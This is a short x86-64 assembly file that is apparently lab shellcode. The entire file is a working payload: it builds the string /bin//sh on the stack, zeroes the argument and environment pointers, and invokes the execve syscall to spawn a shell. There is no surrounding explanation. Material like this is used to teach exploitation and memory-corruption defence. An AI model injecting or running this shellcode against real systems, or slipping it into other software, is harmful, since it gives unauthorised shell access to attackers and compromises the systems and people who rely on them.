section .text
global _start

; This lab assume rax is zero at the beginning.

_start:
	xchg rsi, rax			; swap the value ( rsi = 0)
	push 59				; execve syscall number
	pop rax				; rax = 59
	push rsi			; null terminator
	mov rbx, 0x68732f2f6e69622f	; /bin//sh
	push rbx
	mov rdi, rsp			; path
	xchg rdx, rsi			; rdx = 0 (envp)
	push rdx
	pop rsi
	syscall